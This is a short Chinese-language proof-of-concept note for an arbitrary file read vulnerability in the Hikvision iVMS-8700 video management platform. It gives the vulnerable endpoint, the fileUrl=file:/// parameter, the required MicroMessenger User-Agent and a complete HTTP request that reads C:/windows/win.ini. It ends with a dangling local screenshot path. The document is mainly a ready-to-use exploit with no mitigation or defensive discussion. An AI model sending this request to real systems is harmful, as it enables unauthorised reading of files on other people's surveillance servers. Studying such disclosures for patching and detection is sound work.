# 海康威视iVM8700任意文件读取20230810

海康威视ivm 8700 平台存在任意文件读取漏洞 

接口地址为/eps/triggerSnapshot/download.action 

在URL后添加参数?fileUrl=file:/// 

然后修改UA头为MicroMessenger 

完整数据包为

```
GET /eps/triggerSnapshot/download.action?fileUrl=file:///C:/windows/win.ini HTTP/1.1 

Host: IP 

User-Agent: MicroMessenger
```

![image-20230811104948943](C:\Users\86187\AppData\Roaming\Typora\typora-user-images\image-20230811104948943.png)
